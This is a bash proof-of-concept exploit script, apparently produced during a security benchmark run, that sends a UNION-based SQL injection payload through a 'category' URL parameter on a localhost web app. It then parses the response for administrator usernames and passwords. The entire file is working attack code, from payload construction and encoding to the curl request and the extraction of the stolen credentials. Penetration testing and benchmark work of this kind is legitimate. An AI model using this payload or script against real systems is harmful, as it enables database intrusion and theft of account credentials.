#!/bin/bash
# POC: SQL Injection exploitation to extract admin credentials from the admins table via UNION-based injection in the category parameter
# Target: ./repo
# Created: 2025-11-07T16:18:54.767Z
# Session: benchmark-XBEN-078-24-mhp1edzb

# SQL Injection POC - Admin Credential Extraction
# Exploits SQL injection in category parameter to extract admin credentials
# Target: http://localhost:80/?category=<payload>
# Expected: Extract username and password from admins table

TARGET="http://localhost:80"
CATEGORY_PARAM="category"

# UNION-based SQL injection payload to extract admin credentials
# Payload structure: Nature' UNION SELECT id,CONCAT('User:',username,' Pass:',password),3,4,5,6,7 FROM admins-- -
PAYLOAD="Nature' UNION SELECT id,CONCAT('User:',username,' Pass:',password),3,4,5,6,7 FROM admins-- -"

# URL encode the payload
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${PAYLOAD}'''))")

# Construct the full URL
EXPLOIT_URL="${TARGET}/?${CATEGORY_PARAM}=${ENCODED_PAYLOAD}"

echo "[*] SQL Injection - Admin Credential Extraction POC"
echo "[*] Target: ${TARGET}"
echo "[*] Payload: ${PAYLOAD}"
echo ""
echo "[*] Making request to: ${EXPLOIT_URL}"
echo ""

# Send the exploit request and capture response
RESPONSE=$(curl -s "${EXPLOIT_URL}")

echo "[*] Response received:"
echo ""
echo "${RESPONSE}"
echo ""

# Check if credentials were extracted
if echo "${RESPONSE}" | grep -q "User:.*Pass:"; then
    echo "[+] SUCCESS: Admin credentials extracted!"
    echo ""
    
    # Extract and display credentials
    CREDENTIALS=$(echo "${RESPONSE}" | grep -oP "User:[^ ]+ Pass:\S+" | head -1)
    
    if [ -n "${CREDENTIALS}" ]; then
        echo "[+] Extracted credentials: ${CREDENTIALS}"
        echo ""
        echo "[!] CRITICAL: Admin account compromised!"
        exit 0
    fi
else
    echo "[-] Credentials not found in response"
    echo ""
    echo "[*] Raw response for analysis:"
    echo "${RESPONSE}" | head -50
    exit 1
fi